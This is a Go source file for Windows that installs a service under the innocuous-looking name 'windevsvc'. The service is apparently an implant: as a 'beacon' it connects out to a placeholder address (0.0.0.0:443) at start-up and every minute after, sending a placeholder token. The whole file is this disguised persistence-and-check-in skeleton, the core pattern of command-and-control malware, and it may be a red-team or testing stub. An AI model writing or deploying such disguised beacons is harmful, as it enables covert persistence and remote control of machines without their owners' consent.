// +build windows

package main

import (
	"net"
	"time"

	"golang.org/x/sys/windows/svc"
)

const svcName = "windevsvc"

type beacon struct{}

func main() {
	svc.Run(svcName, beacon{})
}
func (beacon) Execute(_ []string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
	i <- svc.Status{State: svc.StartPending}
	t := time.NewTicker(time.Minute * 1)
	defer t.Stop()
	if k, err := net.Dial("tcp", "0.0.0.0:443"); err == nil {
		k.Write([]byte("<token>"))
		k.Close()
	}
	i <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	for {
		select {
		case q := <-r:
			switch q.Cmd {
			case svc.Interrogate:
				i <- q.CurrentStatus
				time.Sleep(100 * time.Millisecond)
				i <- q.CurrentStatus
			case svc.Stop, svc.Shutdown:
				i <- svc.Status{State: svc.StopPending}
				return false, 0
			default:
			}
		case <-t.C:
			if k, err := net.Dial("tcp", "0.0.0.0:443"); err == nil {
				k.Write([]byte("<token>"))
				k.Close()
			}
		}
	}
	i <- svc.Status{State: svc.StopPending}
	return false, 0
}
